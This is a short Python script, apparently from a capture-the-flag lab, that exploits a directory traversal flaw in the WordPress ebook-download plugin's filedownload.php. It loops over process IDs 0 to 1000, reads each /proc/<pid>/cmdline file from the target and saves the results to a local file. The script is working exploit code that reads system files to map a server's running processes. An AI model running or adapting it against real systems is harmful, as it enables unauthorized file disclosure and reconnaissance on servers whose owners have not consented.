import requests

url = 'http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../proc/{}/cmdline'

with open('process.txt', 'w') as file:
    for i in range(1001):
        url_fuzz = url.format(i)
        req = requests.get(url_fuzz)
        if req.ok:
            file.write(req.text)
            file.write('\n')
        else:
            print("Unable to get process for PID {i}")

# python3 fuzz.py
